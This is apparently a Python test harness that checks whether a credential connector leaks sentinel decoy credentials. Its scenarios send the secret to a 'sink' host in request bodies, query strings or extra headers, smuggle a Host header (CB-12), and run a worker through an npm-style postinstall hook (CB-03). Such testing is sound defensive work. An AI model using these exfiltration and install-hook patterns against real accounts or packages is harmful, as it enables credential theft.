"""这是 2.3 凭据使用绑定的验证测试：只对本次运行自建的账户、哨兵凭据与断网测试上游，检查真值是否被取出、放错位置或发往未授权的目的地；不使用真实账户或真实凭据。"""
import base64
import io
import json
import os
from pathlib import Path
import shlex
import shutil
import subprocess
import sys
import tarfile
import time
import urllib.parse
from cb_install import NAME as PACKAGE
from nb_io import Files
from cb_spec import HOSTS
from cb_wire import exchange


def send(ctx,label,host,path,headers=(),body=b'',method='GET',**kwargs):
    p=ctx.request['parameters'];params={**p,'config':ctx.request['config']}
    result=exchange(params,method,host,path,headers,body,remaining=ctx.remaining,**kwargs)
    ctx.capture(label,result['raw']);ctx.capture(label+'-body',result['body'])
    ctx.observe(label,**{k:v for k,v in result.items() if k not in ('raw','body')})
    return result


def control(ctx):
    from cb_handshake import handshake
    handshake(ctx)
    p=ctx.request['parameters']
    if p.get('reference'):
        return True
    # Nonsecret marker must be witnessed in the real service, not only in the reply.
    r=send(ctx,'control',HOSTS['sink'],p['control_path'],body=p['marker'].encode(),method='POST')
    if r['status']!=200 or not r['complete']:return False
    if p['host']!=HOSTS['sink']:
        r=send(ctx,'source-control',p['host'],p['control_path'],port=p['port'],scheme=p['scheme'])
        if r['status']!=200 or not r['complete']:return False
    return True


def read_value(ctx):
    p=ctx.request['parameters']
    try:
        raw=Path(p['config_path']).read_bytes()
        if len(raw)>16384:raise ValueError('decoy config bound')
        ctx.capture('config',raw)
        value=json.loads(raw)['credential']
        if not isinstance(value,str):raise ValueError('decoy credential schema')
        ctx.observe('config',read=True,errno=None)
        return value
    except FileNotFoundError as exc:
        ctx.capture('config',b'');ctx.observe('config',read=False,errno=exc.errno)
        return ''


def package(ctx,script):
    """The local package as an npm-style tarball: package/package.json declaring the
    postinstall hook, and package/worker.py, the reviewed offline scanner."""
    manifest=json.dumps({'name':PACKAGE,'version':'1.0.0','scripts':{'postinstall':script}}).encode()
    buffer=io.BytesIO()
    with tarfile.open(fileobj=buffer,mode='w:gz') as archive:
        for name,data in (('package.json',manifest),('worker.py',(ctx.payload/'cb_worker.py').read_bytes())):
            info=tarfile.TarInfo('package/'+name);info.size=len(data);info.mode=0o644
            archive.addfile(info,io.BytesIO(data))
    return buffer.getvalue()


def child_action(ctx):
    p=ctx.request['parameters'];root=Path(ctx.cwd);attack=ctx.request['attack']
    request={**p,'config':ctx.request['config'],'attack':attack}
    with (root/p['worker_request']).open('x') as f:json.dump(request,f)
    if attack=='CB-03':
        # Installing the local package is what runs its postinstall (cell/cb_install.py);
        # worker_name is the install prefix, removed again below once the hook has exited.
        script=' '.join(['exec',shlex.quote(sys.executable),'-I','-B','./worker.py',shlex.quote(str(ctx.payload)),
                         shlex.quote(str(root/p['worker_request'])),shlex.quote(str(root))])
        data=package(ctx,script)
        with (root/p['package_name']).open('xb') as f:f.write(data)
        ctx.capture('package',data)
        argv=[sys.executable,'-I','-B',str(ctx.payload/'cb_install.py'),str(root/p['package_name']),
              str(root/p['worker_name'])]
    else:
        installed=root/p['worker_name']
        with installed.open('xb') as f:f.write((ctx.payload/'cb_worker.py').read_bytes())
        argv=[sys.executable,'-I','-B',str(installed),str(ctx.payload),p['worker_request']]
    environment=dict(os.environ)
    # Engine uses the placeholder configuration, undefended uses its preseeded truth configuration.
    value=json.loads(Path(p['config_path']).read_bytes())['credential']
    if ctx.request['config']=='engine':
        environment.update(NB_DECOY_CREDENTIAL=value,NB_DECOY_MARKER=p['marker'])
    elif environment.get('NB_DECOY_CREDENTIAL')!=value or environment.get('NB_DECOY_MARKER')!=p['marker']:
        raise ValueError('undefended parent was not preseeded before launch')
    child=subprocess.Popen(argv,cwd=ctx.cwd,env=environment,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    try:
        ready=root/p['worker_ready']
        while not ready.exists():
            if child.poll() is not None:raise ValueError('declared child exited before handshake')
            ctx.remaining();time.sleep(.01)
        ctx.synchronize('sent') # Host pins child, parent relationship and initial environ before release.
        # Atomic publication: the child polls this name and must never read it created but empty.
        files=Files(str(root))
        try:files.write(p['worker_release'],p['marker'].encode())
        finally:files.close()
        stdout,stderr=child.communicate(timeout=ctx.remaining())
        ctx.capture('child-stdout',stdout);ctx.capture('child-stderr',stderr)
        ctx.observe('child',returncode=child.returncode,executed=True)
        if child.returncode!=0:raise ValueError('offline hook/child failed')
    finally:
        if child.poll() is None:child.kill();child.wait(timeout=1)
        # The host restores flat names only; the cell removes the install tree it created.
        prefix=root/p['worker_name']
        if attack=='CB-03' and os.path.lexists(prefix):shutil.rmtree(prefix)


def action(ctx,attack):
    if ctx.request['attack']!=attack:raise ValueError('explicit module ID mismatch')
    p=ctx.request['parameters'];host=p['host'];path=p['path'];header=p['header']
    if attack in ('CB-03','CB-05') and not p.get('reference'):
        child_action(ctx);return
    ctx.synchronize('sent')
    value=read_value(ctx)
    if p.get('reference'):
        send(ctx,'reference',host,path,[(header,value)],port=p['port'],scheme=p['scheme']);return
    if attack in ('CB-01','CB-02'):
        send(ctx,'action',HOSTS['sink'],path,body=value.encode(),method='POST');return
    if attack=='CB-04':
        send(ctx,'action',HOSTS['sink'],path,[(header,value)] if value else ());return
    if attack=='PC-CREDENTIAL':
        send(ctx,'action',host,path,[(header,value)])
        send(ctx,'missing',host,p['missing_path'])
        send(ctx,'failure',host,p['failure_path'],[(header,value)])
        return
    headers=[(header,value)];body=b'';method='GET'
    if attack=='CB-07':
        branch=p['branch_mode']
        if branch=='body':headers=[];body=value.encode();method='POST'
        elif branch=='query':headers=[];path+='?material='+urllib.parse.quote(value,safe='')
        elif branch=='other':headers=[('x-nb-decoy-other',value)]
        elif branch=='dual':headers.append(('authorization' if header=='x-api-key' else 'x-api-key',value))
        else:raise ValueError('unknown placement branch')
    if attack=='CB-12':headers.append(('host',HOSTS['sink']))
    send(ctx,'action',host,path,headers,body,method,port=p['port'],scheme=p['scheme'],follow=attack=='CB-10')


def keep_action(ctx):
    """CB-14 条款 8: on ONE connection, an authed frame (account A's header) then a header-less frame. The engine
    gives the header-less frame account b'' (ALLOW_NOCRED), a different reuse key, so a correct connector opens a
    fresh upstream connection; only a connector that reuses by (host,port) ignoring account would put the second
    frame on A's connection. The external fact is the keep upstream's per-connection record, read by cb_keep_judge."""
    if ctx.request['attack']!='CB-14':raise ValueError('explicit module ID mismatch')
    from cb_wire import exchange_pair
    p=ctx.request['parameters']
    ctx.synchronize('sent')
    value=read_value(ctx)
    frames=[('GET',p['host'],p['path'],[(p['header'],value)],b''),
            ('GET',p['host'],p['probe_path'],[],b'')]
    results=exchange_pair({**p,'config':ctx.request['config']},frames,remaining=ctx.remaining,
                          port=p['port'],scheme=p['scheme'])
    for label,r in zip(('keep-auth','keep-probe'),results):
        ctx.capture(label,r['raw']);ctx.capture(label+'-body',r['body'])
        ctx.observe(label,**{k:v for k,v in r.items() if k not in ('raw','body')})
    return results
